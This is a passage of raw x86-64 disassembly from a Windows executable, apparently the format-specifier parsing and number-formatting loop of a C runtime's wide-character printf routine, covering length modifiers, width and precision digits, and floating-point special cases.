   1400087df:	e8 cc e6 ff ff       	call   0x140006eb0
   1400087e4:	48 89 b4 24 10 01 00 	mov    %rsi,0x110(%rsp)
   1400087eb:	00 
   1400087ec:	e9 a3 fe ff ff       	jmp    0x140008694
   1400087f1:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   1400087f8:	00 
   1400087f9:	81 64 24 78 ff fe ff 	andl   $0xfffffeff,0x78(%rsp)
   140008800:	ff 
   140008801:	41 83 ff 03          	cmp    $0x3,%r15d
   140008805:	48 8d 70 08          	lea    0x8(%rax),%rsi
   140008809:	0f 84 83 06 00 00    	je     0x140008e92
   14000880f:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   140008816:	00 
   140008817:	41 83 ff 02          	cmp    $0x2,%r15d
   14000881b:	8b 00                	mov    (%rax),%eax
   14000881d:	74 13                	je     0x140008832
   14000881f:	41 83 ff 01          	cmp    $0x1,%r15d
   140008823:	0f 84 5e 07 00 00    	je     0x140008f87
   140008829:	41 83 ff 05          	cmp    $0x5,%r15d
   14000882d:	75 03                	jne    0x140008832
   14000882f:	0f b6 c0             	movzbl %al,%eax
   140008832:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140008837:	83 f9 75             	cmp    $0x75,%ecx
   14000883a:	0f 84 e0 06 00 00    	je     0x140008f20
   140008840:	4d 89 e8             	mov    %r13,%r8
   140008843:	48 89 c2             	mov    %rax,%rdx
   140008846:	e8 f5 f7 ff ff       	call   0x140008040
   14000884b:	48 89 b4 24 10 01 00 	mov    %rsi,0x110(%rsp)
   140008852:	00 
   140008853:	e9 3c fe ff ff       	jmp    0x140008694
   140008858:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   14000885f:	00 
   140008860:	81 4c 24 78 80 00 00 	orl    $0x80,0x78(%rsp)
   140008867:	00 
   140008868:	41 83 ff 03          	cmp    $0x3,%r15d
   14000886c:	48 8d 70 08          	lea    0x8(%rax),%rsi
   140008870:	0f 84 3d 06 00 00    	je     0x140008eb3
   140008876:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   14000887d:	00 
   14000887e:	41 83 ff 02          	cmp    $0x2,%r15d
   140008882:	48 63 08             	movslq (%rax),%rcx
   140008885:	74 14                	je     0x14000889b
   140008887:	41 83 ff 01          	cmp    $0x1,%r15d
   14000888b:	0f 84 28 07 00 00    	je     0x140008fb9
   140008891:	41 83 ff 05          	cmp    $0x5,%r15d
   140008895:	75 04                	jne    0x14000889b
   140008897:	48 0f be c9          	movsbq %cl,%rcx
   14000889b:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   1400088a0:	48 89 c8             	mov    %rcx,%rax
   1400088a3:	4c 89 ea             	mov    %r13,%rdx
   1400088a6:	48 c1 f8 3f          	sar    $0x3f,%rax
   1400088aa:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400088af:	e8 5c ed ff ff       	call   0x140007610
   1400088b4:	48 89 b4 24 10 01 00 	mov    %rsi,0x110(%rsp)
   1400088bb:	00 
   1400088bc:	e9 d3 fd ff ff       	jmp    0x140008694
   1400088c1:	8b 44 24 78          	mov    0x78(%rsp),%eax
   1400088c5:	83 c8 20             	or     $0x20,%eax
   1400088c8:	89 44 24 78          	mov    %eax,0x78(%rsp)
   1400088cc:	48 8b bc 24 10 01 00 	mov    0x110(%rsp),%rdi
   1400088d3:	00 
   1400088d4:	48 83 84 24 10 01 00 	addq   $0x8,0x110(%rsp)
   1400088db:	00 08 
   1400088dd:	a8 04                	test   $0x4,%al
   1400088df:	48 8b 0f             	mov    (%rdi),%rcx
   1400088e2:	0f 84 85 04 00 00    	je     0x140008d6d
   1400088e8:	4c 8b 09             	mov    (%rcx),%r9
   1400088eb:	44 8b 51 08          	mov    0x8(%rcx),%r10d
   1400088ef:	4c 89 c9             	mov    %r9,%rcx
   1400088f2:	48 c1 e9 20          	shr    $0x20,%rcx
   1400088f6:	45 0f bf da          	movswl %r10w,%r11d
   1400088fa:	4c 89 d2             	mov    %r10,%rdx
   1400088fd:	43 8d 34 1b          	lea    (%r11,%r11,1),%esi
   140008901:	81 e1 ff ff ff 7f    	and    $0x7fffffff,%ecx
   140008907:	44 09 c9             	or     %r9d,%ecx
   14000890a:	0f b7 f6             	movzwl %si,%esi
   14000890d:	41 89 c8             	mov    %ecx,%r8d
   140008910:	41 f7 d8             	neg    %r8d
   140008913:	41 09 c8             	or     %ecx,%r8d
   140008916:	41 c1 e8 1f          	shr    $0x1f,%r8d
   14000891a:	41 09 f0             	or     %esi,%r8d
   14000891d:	be fe ff 00 00       	mov    $0xfffe,%esi
   140008922:	44 29 c6             	sub    %r8d,%esi
   140008925:	41 89 f0             	mov    %esi,%r8d
   140008928:	41 c1 f8 10          	sar    $0x10,%r8d
   14000892c:	45 85 c0             	test   %r8d,%r8d
   14000892f:	0f 85 8b 05 00 00    	jne    0x140008ec0
   140008935:	66 45 85 d2          	test   %r10w,%r10w
   140008939:	79 06                	jns    0x140008941
   14000893b:	0c 80                	or     $0x80,%al
   14000893d:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140008941:	66 81 e2 ff 7f       	and    $0x7fff,%dx
   140008946:	85 c9                	test   %ecx,%ecx
   140008948:	75 0b                	jne    0x140008955
   14000894a:	66 81 fa ff 7f       	cmp    $0x7fff,%dx
   14000894f:	0f 84 b7 06 00 00    	je     0x14000900c
   140008955:	66 85 d2             	test   %dx,%dx
   140008958:	4c 89 c9             	mov    %r9,%rcx
   14000895b:	0f 85 14 06 00 00    	jne    0x140008f75
   140008961:	4d 85 c9             	test   %r9,%r9
   140008964:	b8 02 c0 ff ff       	mov    $0xffffc002,%eax
   140008969:	0f 45 d0             	cmovne %eax,%edx
   14000896c:	4d 89 e8             	mov    %r13,%r8
   14000896f:	e8 8c f2 ff ff       	call   0x140007c00
   140008974:	e9 1b fd ff ff       	jmp    0x140008694
   140008979:	8b 44 24 78          	mov    0x78(%rsp),%eax
   14000897d:	83 c8 20             	or     $0x20,%eax
   140008980:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140008984:	48 8b bc 24 10 01 00 	mov    0x110(%rsp),%rdi
   14000898b:	00 
   14000898c:	48 83 84 24 10 01 00 	addq   $0x8,0x110(%rsp)
   140008993:	00 08 
   140008995:	a8 04                	test   $0x4,%al
   140008997:	48 8b 17             	mov    (%rdi),%rdx
   14000899a:	0f 84 8f 03 00 00    	je     0x140008d2f
   1400089a0:	db 2a                	fldt   (%rdx)
   1400089a2:	4c 89 ea             	mov    %r13,%rdx
   1400089a5:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400089aa:	db 7c 24 40          	fstpt  0x40(%rsp)
   1400089ae:	e8 3d f0 ff ff       	call   0x1400079f0
   1400089b3:	e9 dc fc ff ff       	jmp    0x140008694
   1400089b8:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   1400089bc:	41 bf 02 00 00 00    	mov    $0x2,%r15d
   1400089c2:	41 be 04 00 00 00    	mov    $0x4,%r14d
   1400089c8:	66 83 fa 6c          	cmp    $0x6c,%dx
   1400089cc:	0f 85 be fd ff ff    	jne    0x140008790
   1400089d2:	48 8d 5f 04          	lea    0x4(%rdi),%rbx
   1400089d6:	0f b7 57 04          	movzwl 0x4(%rdi),%edx
   1400089da:	41 bf 03 00 00 00    	mov    $0x3,%r15d
   1400089e0:	e9 ab fd ff ff       	jmp    0x140008790
   1400089e5:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   1400089e9:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   1400089ef:	41 be 04 00 00 00    	mov    $0x4,%r14d
   1400089f5:	66 83 fa 68          	cmp    $0x68,%dx
   1400089f9:	0f 85 91 fd ff ff    	jne    0x140008790
   1400089ff:	48 8d 5f 04          	lea    0x4(%rdi),%rbx
   140008a03:	0f b7 57 04          	movzwl 0x4(%rdi),%edx
   140008a07:	41 bf 05 00 00 00    	mov    $0x5,%r15d
   140008a0d:	e9 7e fd ff ff       	jmp    0x140008790
   140008a12:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   140008a16:	41 bf 03 00 00 00    	mov    $0x3,%r15d
   140008a1c:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140008a22:	e9 69 fd ff ff       	jmp    0x140008790
   140008a27:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140008a2b:	83 c8 20             	or     $0x20,%eax
   140008a2e:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140008a32:	48 8b bc 24 10 01 00 	mov    0x110(%rsp),%rdi
   140008a39:	00 
   140008a3a:	48 83 84 24 10 01 00 	addq   $0x8,0x110(%rsp)
   140008a41:	00 08 
   140008a43:	a8 04                	test   $0x4,%al
   140008a45:	48 8b 17             	mov    (%rdi),%rdx
   140008a48:	0f 84 00 03 00 00    	je     0x140008d4e
   140008a4e:	db 2a                	fldt   (%rdx)
   140008a50:	4c 89 ea             	mov    %r13,%rdx
   140008a53:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008a58:	db 7c 24 40          	fstpt  0x40(%rsp)
   140008a5c:	e8 2f f0 ff ff       	call   0x140007a90
   140008a61:	e9 2e fc ff ff       	jmp    0x140008694
   140008a66:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   140008a6d:	00 
   140008a6e:	48 83 84 24 10 01 00 	addq   $0x8,0x110(%rsp)
   140008a75:	00 08 
   140008a77:	41 83 ff 05          	cmp    $0x5,%r15d
   140008a7b:	48 8b 10             	mov    (%rax),%rdx
   140008a7e:	48 63 84 24 94 00 00 	movslq 0x94(%rsp),%rax
   140008a85:	00 
   140008a86:	0f 84 20 04 00 00    	je     0x140008eac
   140008a8c:	41 83 ff 01          	cmp    $0x1,%r15d
   140008a90:	0f 84 e9 04 00 00    	je     0x140008f7f
   140008a96:	41 83 ff 02          	cmp    $0x2,%r15d
   140008a9a:	74 0a                	je     0x140008aa6
   140008a9c:	41 83 ff 03          	cmp    $0x3,%r15d
   140008aa0:	0f 84 3b 04 00 00    	je     0x140008ee1
   140008aa6:	89 02                	mov    %eax,(%rdx)
   140008aa8:	e9 e7 fb ff ff       	jmp    0x140008694
   140008aad:	8b 4c 24 34          	mov    0x34(%rsp),%ecx
   140008ab1:	e8 32 30 00 00       	call   0x14000bae8
   140008ab6:	4c 89 ea             	mov    %r13,%rdx
   140008ab9:	48 89 c1             	mov    %rax,%rcx
   140008abc:	e8 4f e9 ff ff       	call   0x140007410
   140008ac1:	e9 ce fb ff ff       	jmp    0x140008694
   140008ac6:	45 85 f6             	test   %r14d,%r14d
   140008ac9:	75 1c                	jne    0x140008ae7
   140008acb:	44 39 64 24 78       	cmp    %r12d,0x78(%rsp)
   140008ad0:	75 15                	jne    0x140008ae7
   140008ad2:	c7 84 24 80 00 00 00 	movl   $0x10,0x80(%rsp)
   140008ad9:	10 00 00 00 
   140008add:	44 89 e0             	mov    %r12d,%eax
   140008ae0:	80 cc 02             	or     $0x2,%ah
   140008ae3:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140008ae7:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   140008aee:	00 
   140008aef:	4d 89 e8             	mov    %r13,%r8
   140008af2:	b9 78 00 00 00       	mov    $0x78,%ecx
   140008af7:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   140008afe:	00 00 
   140008b00:	48 8b 10             	mov    (%rax),%rdx
   140008b03:	48 8d 70 08          	lea    0x8(%rax),%rsi
   140008b07:	48 89 54 24 60       	mov    %rdx,0x60(%rsp)
   140008b0c:	e8 2f f5 ff ff       	call   0x140008040
   140008b11:	48 89 b4 24 10 01 00 	mov    %rsi,0x110(%rsp)
   140008b18:	00 
   140008b19:	e9 76 fb ff ff       	jmp    0x140008694
   140008b1e:	48 8d 0d 69 0c 38 00 	lea    0x380c69(%rip),%rcx        # 0x14038978e
   140008b25:	4d 89 e8             	mov    %r13,%r8
   140008b28:	ba 01 00 00 00       	mov    $0x1,%edx
   140008b2d:	48 c7 44 24 7c ff ff 	movq   $0xffffffffffffffff,0x7c(%rsp)
   140008b34:	ff ff 
   140008b36:	e8 75 e3 ff ff       	call   0x140006eb0
   140008b3b:	e9 54 fb ff ff       	jmp    0x140008694
   140008b40:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   140008b47:	00 
   140008b48:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
   140008b4f:	ff ff ff ff 
   140008b53:	48 8d 70 08          	lea    0x8(%rax),%rsi
   140008b57:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   140008b5e:	00 
   140008b5f:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140008b64:	4d 89 e8             	mov    %r13,%r8
   140008b67:	ba 01 00 00 00       	mov    $0x1,%edx
   140008b6c:	8b 00                	mov    (%rax),%eax
   140008b6e:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   140008b73:	e8 38 e3 ff ff       	call   0x140006eb0
   140008b78:	48 89 b4 24 10 01 00 	mov    %rsi,0x110(%rsp)
   140008b7f:	00 
   140008b80:	e9 0f fb ff ff       	jmp    0x140008694
   140008b85:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140008b89:	e9 f6 fd ff ff       	jmp    0x140008984
   140008b8e:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140008b92:	e9 78 fb ff ff       	jmp    0x14000870f
   140008b97:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140008b9b:	e9 92 fe ff ff       	jmp    0x140008a32
   140008ba0:	45 85 f6             	test   %r14d,%r14d
   140008ba3:	0f 84 8f 02 00 00    	je     0x140008e38
   140008ba9:	41 83 fe 03          	cmp    $0x3,%r14d
   140008bad:	0f 86 73 02 00 00    	jbe    0x140008e26
   140008bb3:	4d 89 e8             	mov    %r13,%r8
   140008bb6:	ba 01 00 00 00       	mov    $0x1,%edx
   140008bbb:	48 89 f3             	mov    %rsi,%rbx
   140008bbe:	48 c7 44 24 7c ff ff 	movq   $0xffffffffffffffff,0x7c(%rsp)
   140008bc5:	ff ff 
   140008bc7:	48 8d 0d c0 0b 38 00 	lea    0x380bc0(%rip),%rcx        # 0x14038978e
   140008bce:	e8 dd e2 ff ff       	call   0x140006eb0
   140008bd3:	e9 bc fa ff ff       	jmp    0x140008694
   140008bd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140008bdf:	00 
   140008be0:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140008be4:	e9 e3 fc ff ff       	jmp    0x1400088cc
   140008be9:	41 83 fe 01          	cmp    $0x1,%r14d
   140008bed:	0f 86 5d 02 00 00    	jbe    0x140008e50
   140008bf3:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   140008bf7:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140008bfd:	e9 8e fb ff ff       	jmp    0x140008790
   140008c02:	45 85 f6             	test   %r14d,%r14d
   140008c05:	75 49                	jne    0x140008c50
   140008c07:	81 4c 24 78 00 08 00 	orl    $0x800,0x78(%rsp)
   140008c0e:	00 
   140008c0f:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   140008c13:	e9 78 fb ff ff       	jmp    0x140008790
   140008c18:	4d 85 d2             	test   %r10,%r10
   140008c1b:	74 d6                	je     0x140008bf3
   140008c1d:	41 f7 c6 fd ff ff ff 	test   $0xfffffffd,%r14d
   140008c24:	0f 84 c9 02 00 00    	je     0x140008ef3
   140008c2a:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   140008c2e:	45 31 d2             	xor    %r10d,%r10d
   140008c31:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140008c37:	e9 54 fb ff ff       	jmp    0x140008790
   140008c3c:	45 85 f6             	test   %r14d,%r14d
   140008c3f:	75 0f                	jne    0x140008c50
   140008c41:	81 4c 24 78 00 01 00 	orl    $0x100,0x78(%rsp)
   140008c48:	00 
   140008c49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140008c50:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   140008c54:	e9 37 fb ff ff       	jmp    0x140008790
   140008c59:	45 85 f6             	test   %r14d,%r14d
   140008c5c:	75 f2                	jne    0x140008c50
   140008c5e:	81 4c 24 78 00 10 00 	orl    $0x1000,0x78(%rsp)
   140008c65:	00 
   140008c66:	41 c7 03 00 00 00 00 	movl   $0x0,(%r11)
   140008c6d:	4c 89 54 24 38       	mov    %r10,0x38(%rsp)
   140008c72:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   140008c77:	e8 3c 2e 00 00       	call   0x14000bab8
   140008c7c:	4c 8b 5c 24 20       	mov    0x20(%rsp),%r11
   140008c81:	48 8d 4c 24 5e       	lea    0x5e(%rsp),%rcx
   140008c86:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140008c8c:	48 8b 50 08          	mov    0x8(%rax),%rdx
   140008c90:	4d 89 d9             	mov    %r11,%r9
   140008c93:	e8 88 2b 00 00       	call   0x14000b820
   140008c98:	4c 8b 5c 24 20       	mov    0x20(%rsp),%r11
   140008c9d:	85 c0                	test   %eax,%eax
   140008c9f:	4c 8b 54 24 38       	mov    0x38(%rsp),%r10
   140008ca4:	7e 0d                	jle    0x140008cb3
   140008ca6:	0f b7 54 24 5e       	movzwl 0x5e(%rsp),%edx
   140008cab:	66 89 94 24 90 00 00 	mov    %dx,0x90(%rsp)
   140008cb2:	00 
   140008cb3:	89 84 24 8c 00 00 00 	mov    %eax,0x8c(%rsp)
   140008cba:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   140008cbe:	e9 cd fa ff ff       	jmp    0x140008790
   140008cc3:	83 ea 30             	sub    $0x30,%edx
   140008cc6:	66 83 fa 09          	cmp    $0x9,%dx
   140008cca:	0f 87 e3 fe ff ff    	ja     0x140008bb3
   140008cd0:	41 83 fe 03          	cmp    $0x3,%r14d
   140008cd4:	0f 87 d9 fe ff ff    	ja     0x140008bb3
   140008cda:	45 85 f6             	test   %r14d,%r14d
   140008cdd:	0f 85 43 01 00 00    	jne    0x140008e26
   140008ce3:	41 be 01 00 00 00    	mov    $0x1,%r14d
   140008ce9:	4d 85 d2             	test   %r10,%r10
   140008cec:	0f 84 5e ff ff ff    	je     0x140008c50
   140008cf2:	41 8b 02             	mov    (%r10),%eax
   140008cf5:	85 c0                	test   %eax,%eax
   140008cf7:	0f 88 48 01 00 00    	js     0x140008e45
   140008cfd:	8d 04 80             	lea    (%rax,%rax,4),%eax
   140008d00:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   140008d04:	8d 44 41 d0          	lea    -0x30(%rcx,%rax,2),%eax
   140008d08:	41 89 02             	mov    %eax,(%r10)
   140008d0b:	e9 80 fa ff ff       	jmp    0x140008790
   140008d10:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140008d15:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008d1a:	dd 44 24 20          	fldl   0x20(%rsp)
   140008d1e:	4c 89 ea             	mov    %r13,%rdx
   140008d21:	db 7c 24 40          	fstpt  0x40(%rsp)
   140008d25:	e8 36 e8 ff ff       	call   0x140007560
   140008d2a:	e9 65 f9 ff ff       	jmp    0x140008694
   140008d2f:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140008d34:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008d39:	dd 44 24 20          	fldl   0x20(%rsp)
   140008d3d:	4c 89 ea             	mov    %r13,%rdx
   140008d40:	db 7c 24 40          	fstpt  0x40(%rsp)
   140008d44:	e8 a7 ec ff ff       	call   0x1400079f0
   140008d49:	e9 46 f9 ff ff       	jmp    0x140008694
   140008d4e:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140008d53:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008d58:	dd 44 24 20          	fldl   0x20(%rsp)
   140008d5c:	4c 89 ea             	mov    %r13,%rdx
   140008d5f:	db 7c 24 40          	fstpt  0x40(%rsp)
   140008d63:	e8 28 ed ff ff       	call   0x140007a90
   140008d68:	e9 27 f9 ff ff       	jmp    0x140008694
   140008d6d:	49 89 c8             	mov    %rcx,%r8
   140008d70:	89 ca                	mov    %ecx,%edx
   140008d72:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140008d77:	dd 44 24 20          	fldl   0x20(%rsp)
   140008d7b:	db 7c 24 20          	fstpt  0x20(%rsp)
   140008d7f:	db 6c 24 20          	fldt   0x20(%rsp)
   140008d83:	49 c1 e8 20          	shr    $0x20,%r8
   140008d87:	f7 da                	neg    %edx
   140008d89:	09 ca                	or     %ecx,%edx
   140008d8b:	45 89 c1             	mov    %r8d,%r9d
   140008d8e:	41 81 e1 ff ff ff 7f 	and    $0x7fffffff,%r9d
   140008d95:	c1 ea 1f             	shr    $0x1f,%edx
   140008d98:	db 7c 24 60          	fstpt  0x60(%rsp)
   140008d9c:	44 09 ca             	or     %r9d,%edx
   140008d9f:	41 b9 00 00 f0 7f    	mov    $0x7ff00000,%r9d
   140008da5:	41 39 d1             	cmp    %edx,%r9d
   140008da8:	0f 88 12 01 00 00    	js     0x140008ec0
   140008dae:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140008db3:	66 85 d2             	test   %dx,%dx
   140008db6:	0f 88 1a 01 00 00    	js     0x140008ed6
   140008dbc:	44 89 c0             	mov    %r8d,%eax
   140008dbf:	41 81 e0 00 00 f0 7f 	and    $0x7ff00000,%r8d
   140008dc6:	25 ff ff 0f 00       	and    $0xfffff,%eax
   140008dcb:	09 c1                	or     %eax,%ecx
   140008dcd:	41 0f 95 c1          	setne  %r9b
   140008dd1:	41 81 f8 00 00 f0 7f 	cmp    $0x7ff00000,%r8d
   140008dd8:	0f 95 c0             	setne  %al
   140008ddb:	41 08 c1             	or     %al,%r9b
   140008dde:	75 09                	jne    0x140008de9
   140008de0:	44 09 c1             	or     %r8d,%ecx
   140008de3:	0f 85 f7 01 00 00    	jne    0x140008fe0
   140008de9:	66 81 e2 ff 7f       	and    $0x7fff,%dx
   140008dee:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140008df3:	0f 84 3f 01 00 00    	je     0x140008f38
   140008df9:	66 81 fa 00 3c       	cmp    $0x3c00,%dx
   140008dfe:	0f 8f 34 01 00 00    	jg     0x140008f38
   140008e04:	44 0f bf c2          	movswl %dx,%r8d
   140008e08:	b9 01 3c 00 00       	mov    $0x3c01,%ecx
   140008e0d:	44 29 c1             	sub    %r8d,%ecx
   140008e10:	48 d3 e8             	shr    %cl,%rax
   140008e13:	01 ca                	add    %ecx,%edx
   140008e15:	66 81 ea fc 3f       	sub    $0x3ffc,%dx
   140008e1a:	48 c1 e8 03          	shr    $0x3,%rax
   140008e1e:	48 89 c1             	mov    %rax,%rcx
   140008e21:	e9 46 fb ff ff       	jmp    0x14000896c
   140008e26:	41 83 fe 02          	cmp    $0x2,%r14d
   140008e2a:	b8 03 00 00 00       	mov    $0x3,%eax
   140008e2f:	44 0f 44 f0          	cmove  %eax,%r14d
   140008e33:	e9 b1 fe ff ff       	jmp    0x140008ce9
   140008e38:	81 4c 24 78 00 02 00 	orl    $0x200,0x78(%rsp)
   140008e3f:	00 
   140008e40:	e9 0b fe ff ff       	jmp    0x140008c50
   140008e45:	83 e9 30             	sub    $0x30,%ecx
   140008e48:	41 89 0a             	mov    %ecx,(%r10)
   140008e4b:	e9 00 fe ff ff       	jmp    0x140008c50
   140008e50:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   140008e54:	4d 8d 55 10          	lea    0x10(%r13),%r10
   140008e58:	41 be 02 00 00 00    	mov    $0x2,%r14d
   140008e5e:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%rsp)
   140008e65:	00 00 00 00 
   140008e69:	e9 22 f9 ff ff       	jmp    0x140008790
   140008e6e:	66 83 7f 04 34       	cmpw   $0x34,0x4(%rdi)
   140008e73:	0f 85 3a fd ff ff    	jne    0x140008bb3
   140008e79:	48 8d 5f 06          	lea    0x6(%rdi),%rbx
   140008e7d:	0f b7 57 06          	movzwl 0x6(%rdi),%edx
   140008e81:	41 bf 03 00 00 00    	mov    $0x3,%r15d
   140008e87:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140008e8d:	e9 fe f8 ff ff       	jmp    0x140008790
   140008e92:	48 8b 00             	mov    (%rax),%rax
   140008e95:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140008e9a:	e9 98 f9 ff ff       	jmp    0x140008837
   140008e9f:	48 89 f9             	mov    %rdi,%rcx
   140008ea2:	e8 71 2c 00 00       	call   0x14000bb18
   140008ea7:	e9 2b f9 ff ff       	jmp    0x1400087d7
   140008eac:	88 02                	mov    %al,(%rdx)
   140008eae:	e9 e1 f7 ff ff       	jmp    0x140008694
   140008eb3:	48 8b 08             	mov    (%rax),%rcx
   140008eb6:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   140008ebb:	e9 e0 f9 ff ff       	jmp    0x1400088a0
   140008ec0:	48 8d 15 cb 08 38 00 	lea    0x3808cb(%rip),%rdx        # 0x140389792
   140008ec7:	4d 89 e8             	mov    %r13,%r8
   140008eca:	31 c9                	xor    %ecx,%ecx
   140008ecc:	e8 bf de ff ff       	call   0x140006d90
   140008ed1:	e9 be f7 ff ff       	jmp    0x140008694
   140008ed6:	0c 80                	or     $0x80,%al
   140008ed8:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140008edc:	e9 db fe ff ff       	jmp    0x140008dbc
   140008ee1:	48 89 02             	mov    %rax,(%rdx)
   140008ee4:	e9 ab f7 ff ff       	jmp    0x140008694
   140008ee9:	48 89 fb             	mov    %rdi,%rbx
   140008eec:	31 c9                	xor    %ecx,%ecx
   140008eee:	e9 8a f6 ff ff       	jmp    0x14000857d
   140008ef3:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   140008efa:	00 
   140008efb:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140008eff:	8b 00                	mov    (%rax),%eax
   140008f01:	85 c0                	test   %eax,%eax
   140008f03:	41 89 02             	mov    %eax,(%r10)
   140008f06:	0f 88 88 00 00 00    	js     0x140008f94
   140008f0c:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   140008f10:	48 89 8c 24 10 01 00 	mov    %rcx,0x110(%rsp)
   140008f17:	00 
   140008f18:	45 31 d2             	xor    %r10d,%r10d
   140008f1b:	e9 70 f8 ff ff       	jmp    0x140008790
   140008f20:	4c 89 ea             	mov    %r13,%rdx
   140008f23:	48 89 c1             	mov    %rax,%rcx
   140008f26:	e8 e5 e6 ff ff       	call   0x140007610
   140008f2b:	48 89 b4 24 10 01 00 	mov    %rsi,0x110(%rsp)
   140008f32:	00 
   140008f33:	e9 5c f7 ff ff       	jmp    0x140008694
   140008f38:	66 85 d2             	test   %dx,%dx
   140008f3b:	0f 85 d4 fe ff ff    	jne    0x140008e15
   140008f41:	48 85 c0             	test   %rax,%rax
   140008f44:	b9 05 fc ff ff       	mov    $0xfffffc05,%ecx
   140008f49:	0f 45 d1             	cmovne %ecx,%edx
   140008f4c:	e9 c9 fe ff ff       	jmp    0x140008e1a
   140008f51:	66 83 7f 04 32       	cmpw   $0x32,0x4(%rdi)
   140008f56:	74 6f                	je     0x140008fc7
   140008f58:	48 89 df             	mov    %rbx,%rdi
   140008f5b:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140008f61:	41 bf 03 00 00 00    	mov    $0x3,%r15d
   140008f67:	b9 33 00 00 00       	mov    $0x33,%ecx
   140008f6c:	48 83 c3 02          	add    $0x2,%rbx
   140008f70:	e9 d8 f6 ff ff       	jmp    0x14000864d
   140008f75:	66 81 ea ff 3f       	sub    $0x3fff,%dx
   140008f7a:	e9 ed f9 ff ff       	jmp    0x14000896c
   140008f7f:	66 89 02             	mov    %ax,(%rdx)
   140008f82:	e9 0d f7 ff ff       	jmp    0x140008694
   140008f87:	0f b7 c0             	movzwl %ax,%eax
   140008f8a:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140008f8f:	e9 a3 f8 ff ff       	jmp    0x140008837
   140008f94:	45 85 f6             	test   %r14d,%r14d
   140008f97:	75 63                	jne    0x140008ffc
   140008f99:	f7 5c 24 7c          	negl   0x7c(%rsp)
   140008f9d:	48 89 8c 24 10 01 00 	mov    %rcx,0x110(%rsp)
   140008fa4:	00 
   140008fa5:	45 31 d2             	xor    %r10d,%r10d
   140008fa8:	81 4c 24 78 00 04 00 	orl    $0x400,0x78(%rsp)
   140008faf:	00 
   140008fb0:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   140008fb4:	e9 d7 f7 ff ff       	jmp    0x140008790
   140008fb9:	48 0f bf c9          	movswq %cx,%rcx
   140008fbd:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   140008fc2:	e9 d9 f8 ff ff       	jmp    0x1400088a0
   140008fc7:	48 8d 5f 06          	lea    0x6(%rdi),%rbx
   140008fcb:	0f b7 57 06          	movzwl 0x6(%rdi),%edx
   140008fcf:	41 bf 02 00 00 00    	mov    $0x2,%r15d
   140008fd5:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140008fdb:	e9 b0 f7 ff ff       	jmp    0x140008790
   140008fe0:	89 d1                	mov    %edx,%ecx
   140008fe2:	4d 89 e8             	mov    %r13,%r8
   140008fe5:	48 8d 15 aa 07 38 00 	lea    0x3807aa(%rip),%rdx        # 0x140389796
   140008fec:	81 e1 00 80 00 00    	and    $0x8000,%ecx
   140008ff2:	e8 99 dd ff ff       	call   0x140006d90
   140008ff7:	e9 98 f6 ff ff       	jmp    0x140008694
   140008ffc:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
